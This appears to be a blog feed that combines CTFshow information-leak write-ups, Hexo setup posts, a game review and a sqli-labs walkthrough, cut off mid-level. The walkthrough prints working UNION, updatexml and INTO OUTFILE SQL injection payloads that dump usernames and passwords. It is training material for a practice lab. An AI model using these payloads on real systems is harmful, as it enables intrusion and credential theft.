<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p><strong>考点: 编辑器配置不当</strong><br>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>首先根据提示，访问： <code>url/editor</code><br>这个界面具有编辑提交功能<br>我们点击图片上传或文件上传<br>可以看到目录，<br>查找 <code>/var/www/html/nothinghere/fl000g.txt</code><br>可以得到我们需要的文件，然后在url栏输入：<br><code>url/nothinghere/fl000g.txt</code><br>得到flag<br>这一题的关键在于没有经验很难找到关键文件，一般在www目录下会有关键信息。</p>
<h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p><strong>考点: 密码逻辑脆弱</strong><br>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br>根据提示，拿到了公开的邮箱，<br>然后登录后台 <code>url/admin</code><br>随便输入一个密码无法登录，发现有个忘记密码选项，于是点击忘记密码，发现需要输入居住城市。于是我们想到了刚才那个邮箱，搜索QQ发现qq上的城市为西安，输入西安，密码重置。再次登录，获得flag<br>这一题提示我们要更灵活一点，善于利用信息！</p>
<h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p><strong>考点: 探针泄露</strong><br>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<ul>
<li>PHP探针:<br>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针。<br>根据探针的提示，我们可以访问： <code>url/tz.php</code><br>进入探针界面，然后发现界面有一个phpinfo，我们点进去，用CTRL+F，搜索ctf，找到flag</li>
</ul>
<h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p><strong>考点：sql备份文件泄露</strong><br>题目描述：备份的sql文件会泄露敏感信息<br>根据提示，我们访问： <code>url/backup.sql</code><br>弹出下载框，下载后打开，找到flag</p>
<h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p><strong>考点: js敏感信息泄露</strong><br>题目描述：不要着急，休息，休息一会儿，玩101分给你flag<br>直接打开F12，看到有一个js文件，我们直接加在url后面：<br><code>url/js/Flappy_js.js</code><br>打开后发现了一段unicode代码，我们解码成中文后，发现提示是110.php<br>于是将该php加在url后面：<br><code>url/110.php</code><br>得到flag</p>
<h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p><strong>考点: 前端密钥泄露</strong><br>题目描述：密钥什么的，就不要放在前端了<br>根据描述，发现前端验证，直接抓包，将验证内容输入到包里再发送<br>成功拿到flag</p>
<h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p><strong>考点: 数据库恶意下载</strong><br>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加 <code>/db/db.mdb</code> 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag<br>得到flag</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>通过这次信息收集的训练，我又进步了一点点~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_46150940/article/details/113788511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-113788511-blog-116881655.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-113788511-blog-116881655.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">CTFshow-Web入门-信息泄露</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/11/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>First Blog</title>
    <url>/2022/11/03/first_blog/</url>
    <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次搭建博客是我第一次搭建，总共花费了我两天两夜，过程很煎熬，遇到了不少挫折，不过还是很值得，我对此毫不后悔。</p>
<h1 id="想法萌芽"><a href="#想法萌芽" class="headerlink" title="想法萌芽"></a>想法萌芽</h1><p>搭建这个博客是因为想到要开始学web安全的技术，有很多知识点需要记录查阅。于是在网上查，看到了一篇名叫<a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a>的文章，正是因为看到了这篇文章我才知道搭建博客并没有我想象中那么难。从而开始了博客之旅。</p>
<h1 id="所需能力"><a href="#所需能力" class="headerlink" title="所需能力"></a>所需能力</h1><p>搭完博客后，我认为如果只是想搭一个普通的博客，其中的技术含量并没有多少。困难之处通常是因为网上的文章过时或是与自己的配置不和而导致的出错等。唯一需要的是耐心与查阅资料的能力。<br><del>在搭建博客期间最擅长的代码</del>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>

<h1 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h1><p>本来想买域名的，但我重新审视了自己的内心之后，发现其实买域名只是为了满足自己的虚荣心。在现阶段根本不需要域名。于是最终放弃了购买域名。我想，等我发表了10篇<strong>有点内容</strong>的博客后我再购买域名吧。</p>
<h1 id="挫折点"><a href="#挫折点" class="headerlink" title="挫折点"></a>挫折点</h1><ol>
<li><strong>git与GitHub连接</strong>。由于我自己的大意以及参考文章的不严谨导致第一天晚上多熬了一个多小时的夜。</li>
<li><strong>安装node.js和Hexo</strong>。先是更改nodejs的配置环境，从C盘到D盘。这步倒还好，顺利进行了。但随之而来的Hexo的安装就惨了。因为前面nodejs的配置不是通常情况，参考文章也偶尔出错，导致我不断报错。而每次报错我又到网上查原因，再根据其它文章打补丁。一来二去，问题没解决，头却大了。就这个问题，让我在电脑前像僵尸一样坐了三个多小时，最后气得我把nodejs和hexo及其相关文件全卸载，所有网页全关了。之后重新下载，在网上随便找了篇文章。竟然奇迹般十分钟就解决了（应该说本来就只该花这点时间吗&#x2F;(ㄒoㄒ)&#x2F;~~）</li>
<li><strong>美化网页</strong>。完全是大意了，本以为网站都搭好了，应该不会出现什么问题了，于是在网上东找一点西找一点，未曾想落入了大意的圈套。这个圈套就是“分享”。不知道看了谁的文章，稀里糊涂下载了分享模块，结果出现了无论如何也无法消灭的高危漏洞。这便是噩梦的开始，恶魔的降临，恶意的迸发。心力憔悴地折腾了四个小时后，我最终不甘心地向现实低头–卸载所有内容，网站从零开始。</li>
</ol>
<h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><ul>
<li>最好找<strong>2年</strong>以内的文章。太久远的由于时效性往往会导致不兼容或是其它错误。</li>
<li>最好看那些<em>评论数多或是点赞多</em>的文章。以便能够顺利搭建，即便不能也可以看看和自己有类似情况或是已经解决问题的人。</li>
<li><em>多对比慎操作</em>。不要看到一篇文章怎么写就马上实操，尽量多搜几篇文章看看他们的处理方案，从中选优。毕竟试错成本可能会很高。</li>
<li>自己操作的时候要<em>看清楚</em>。多花两分钟看，总比多花两小时排错好。</li>
<li>保持<em>耐心</em>。实在厌烦排错的时候不妨重装。</li>
<li>网站不要放到<em>社交平台</em>上。容易被盯上网站被黑。（等我啥时候安全技术强了就不怕了,,ԾㅂԾ,,）</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ol>
<li>这篇文章是我搭建博客的开始，虽然有些问题，不过不影响我对它的感谢。<br><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a></li>
<li>虽然是在2017年写就的文章，过了5年到如今仍然适用。也是这篇文章把我从第2个挫折点的痛苦旋涡中解救出来。<br><a href="https://www.jianshu.com/p/3f2fe426edff">在Windows环境下使用hexo搭建博客</a></li>
<li>在我优化博客的时候有许多优质文章提供了帮助。</li>
</ol>
<p><a href="https://kumarinko.gitee.io/2022/01/01/Build_hexo-next_Blog/">hexo-next博客搭建</a></p>
<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1952241">hexo插件篇</a></p>
<p><a href="https://blog.csdn.net/qnhnt/article/details/126330886">Hexo-NexT v8.x字数统计以及阅读时间配置</a></p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>搭建博客</tag>
      </tags>
  </entry>
  <entry>
    <title>《空洞骑士》：一场探索未知迷宫的沉浸式体验</title>
    <url>/2023/02/24/hollow_knight/</url>
    <content><![CDATA[<p><img src="/images/Hollow_Knight_1.jpg" alt="Hollow Knight"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初玩时不觉得，越玩越有味道。<br>空洞骑士真乃神作也。</p>
<h1 id="逐渐深入的乐趣：空洞骑士的游戏设计"><a href="#逐渐深入的乐趣：空洞骑士的游戏设计" class="headerlink" title="逐渐深入的乐趣：空洞骑士的游戏设计"></a>逐渐深入的乐趣：空洞骑士的游戏设计</h1><p>起初玩空洞骑士，感觉只是一款单一的游戏。一开始没有疾跑，只有走，回血，攻击。可谓是让人感觉略显单薄。<br>由于这款游戏在steam上好评率非常高，并且许多人把它称之为神作，再加上看过一些游戏片段，知道后面会变得丰富后，我耐着性子玩了下去。<br>初期阶段的我什么都不懂，只知道打怪，东走走西走走，因为不知道自己要达成什么目标，所以显得如无头苍蝇般无所适从。于是看了看攻略视频。<br>之后，慢慢地，有了冲刺，有了爬墙，有了冲击波……我感觉操作丰富了起来。我也不再需要攻略，摸索地图有了自己的路线，打怪走路有了自己的节奏，甚至有了自己刷金币的方式。一点一点充实背包，一点一点扩大地图，探索未知的好奇，让我心情愉悦。</p>
<h1 id="享受迷宫探索：手残党的空洞骑士游戏体验"><a href="#享受迷宫探索：手残党的空洞骑士游戏体验" class="headerlink" title="享受迷宫探索：手残党的空洞骑士游戏体验"></a>享受迷宫探索：手残党的空洞骑士游戏体验</h1><p>我自己算是手残党吧，能为了过一个地方花上一小时，为了打败一个boss死好多次。因此同等情形下游玩时间也比别人多，不过我并不在意，我享受这个过程。我就像是真正处于一个未知幽深的迷宫中，带着好奇心与勇气，谨慎却不失大胆。会提心吊胆地走在未知领域，也会为了丢失一千多吉欧而懊恼不已，会为了打败boss而兴奋不已，也会为了强敌而选择逃离。这是一个享受的过程。</p>
<h1 id="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"><a href="#攻略指引启蒙：游戏探索中攻略和沉浸的平衡" class="headerlink" title="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"></a>攻略指引启蒙：游戏探索中攻略和沉浸的平衡</h1><p>没搞清楚游戏的玩法前，可以看看攻略启发游玩方式。毕竟有时不看攻略某些操作是真不知道怎么做（比如下劈能往上弹）。弄清楚游戏的玩法后，就完全没必要看攻略了（除非卡关）。沉浸式体验其中，那才是最重要的。</p>
<h1 id="完美融合：空洞骑士的艺术设计与游戏机制"><a href="#完美融合：空洞骑士的艺术设计与游戏机制" class="headerlink" title="完美融合：空洞骑士的艺术设计与游戏机制"></a>完美融合：空洞骑士的艺术设计与游戏机制</h1><p>以上说的还是玩法的部分，其游戏的美术画面音乐部分也是非常具有风格，操作按键之类也非常流畅自然。甚至隐隐有只狼那种拼刀的感觉。而这，仅仅是2017年发布的一款2D类动作冒险游戏。<br>这款游戏无愧于神作！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看steam评论区游玩时长大多是60h以上，甚至不乏二百小时的，而我目前才十多小时，看来距离通关还有很久…<br>听说第二部《丝之歌》快要出来了，非常期待~</p>
]]></content>
      <categories>
        <category>game</category>
      </categories>
      <tags>
        <tag>game</tag>
        <tag>recommend</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs 1-65</title>
    <url>/2023/01/11/sqli-labs%201-65/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次为sqli-labs的合集，为了方便。</p>
<span id="more"></span>
<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="1-2-GET方式的数字型和字符型的联合注入"><a href="#1-2-GET方式的数字型和字符型的联合注入" class="headerlink" title="1-2(GET方式的数字型和字符型的联合注入)"></a>1-2(GET方式的数字型和字符型的联合注入)</h2><ol>
<li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li>
</ol>
<ul>
<li>有提示。则存在SQL注入</li>
<li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li>
</ul>
<ol start="2">
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure>
<p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
<p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()   		  MySQL版本</span><br><span class="line">user()     			  数据库用户名</span><br><span class="line">database() 			  数据库名</span><br><span class="line">@@datadir  			  数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p>
</li>
</ol>
<ul>
<li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure>
<p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p>
</li>
<li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure>
<p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure>
<p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p>
</li>
<li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p>
</li>
</ul>
<p>在本关中具体语句即为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
<p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p>
</li>
<li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="3-GET方式的字符型的联合注入"><a href="#3-GET方式的字符型的联合注入" class="headerlink" title="3(GET方式的字符型的联合注入)"></a>3(GET方式的字符型的联合注入)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="4-GET方式的字符型的联合注入"><a href="#4-GET方式的字符型的联合注入" class="headerlink" title="4(GET方式的字符型的联合注入)"></a>4(GET方式的字符型的联合注入)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="5-6-GET方式的报错注入"><a href="#5-6-GET方式的报错注入" class="headerlink" title="5-6(GET方式的报错注入)"></a>5-6(GET方式的报错注入)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
</li>
</ol>
<h2 id="7-GET方式的读写文件"><a href="#7-GET方式的读写文件" class="headerlink" title="7(GET方式的读写文件)"></a>7(GET方式的读写文件)</h2><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’--+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))--+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p>
</li>
</ol>
<ul>
<li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li>
<li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li>
</ul>
<p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p>
<ul>
<li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li>
<li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>
secure_file_priv 一栏的value为空，即是成功</li>
</ul>
<p>之后就能愉快地获取库名和版本号了,示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
